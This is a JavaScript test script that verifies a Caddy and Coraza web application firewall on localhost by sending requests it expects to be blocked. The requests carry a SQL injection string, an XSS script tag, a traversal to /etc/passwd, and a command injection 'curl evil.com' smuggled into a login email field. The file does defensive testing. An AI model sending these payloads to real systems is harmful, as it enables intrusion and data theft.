// 前置 Caddy + Coraza WAF 效果验证
// 默认测试地址：https://localhost:3443（Caddy 自签名证书需忽略 TLS 校验）
import dotenv from 'dotenv'

dotenv.config({ path: ['.env', '.env.local'], override: true })

const BASE = process.env.WAF_BASE_URL || 'https://localhost:3443'

// 本地自签名证书：忽略 TLS 校验
if (BASE.startsWith('https://localhost')) {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
}

async function req(path, options = {}) {
  const res = await fetch(`${BASE}${path}`, {
    method: options.method || 'GET',
    headers: {
      'Content-Type': 'application/json',
      ...(options.headers || {}),
    },
    body: options.body ? JSON.stringify(options.body) : undefined,
    // 本地自签名证书
    ...(BASE.startsWith('https://localhost') ? { dispatcher: undefined } : {}),
  })
  const text = await res.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: res.status, headers: res.headers, json, text }
}

function assert(condition, message) {
  if (!condition) throw new Error(message)
}

async function main() {
  console.log('🛡️ 前置 Caddy + Coraza WAF 测试')
  console.log(`   目标：${BASE}\n`)

  // 1. 正常请求应通过
  const { status: s0 } = await req('/api/health')
  assert(s0 === 200, `正常请求应通过，实际 ${s0}`)
  console.log('  ✅ 正常请求通过 WAF')

  // 2. SQL 注入（GET 查询参数）
  const { status: s1, headers: h1 } = await req('/api/health?id=1\' OR \'1\'=\'1')
  assert(s1 === 403, `SQLi 应被 WAF 拦截，实际 ${s1}`)
  assert((h1.get('x-blocked-by') || '').includes('coraza'), '应携带 X-Blocked-By: coraza 头')
  console.log('  ✅ GET SQL 注入被前置 WAF 拦截')

  // 3. XSS（GET 查询参数）
  const { status: s2 } = await req('/api/health?x=<script>alert(1)</script>')
  assert(s2 === 403, `XSS 应被 WAF 拦截，实际 ${s2}`)
  console.log('  ✅ XSS 被前置 WAF 拦截')

  // 4. 路径遍历（请求路径）
  const { status: s3 } = await req('/api/health/../../../etc/passwd')
  assert(s3 === 403, `路径遍历应被 WAF 拦截，实际 ${s3}`)
  console.log('  ✅ 路径遍历被前置 WAF 拦截')

  // 5. 命令注入（POST body）
  const { status: s4 } = await req('/api/login', {
    method: 'POST',
    body: { email: 'a@b.com; curl evil.com', password: 'x' },
  })
  assert(s4 === 403, `命令注入应被 WAF 拦截，实际 ${s4}`)
  console.log('  ✅ POST body 命令注入被前置 WAF 拦截')

  // 6. 敏感文件访问应被静态拦截
  const { status: s5 } = await req('/.git/config')
  assert(s5 === 403, `.git/config 应被拦截，实际 ${s5}`)
  console.log('  ✅ .git/config 被前置静态拦截')

  // 7. 源码文件访问应被静态拦截
  const { status: s6 } = await req('/src/utils/security.ts')
  assert(s6 === 403, `源码文件应被拦截，实际 ${s6}`)
  console.log('  ✅ 源码文件被前置静态拦截')

  console.log('\n✅ 前置 Caddy + Coraza WAF 测试通过')
}

main().catch(err => {
  console.error('\n❌ 测试失败:', err.message)
  process.exit(1)
})
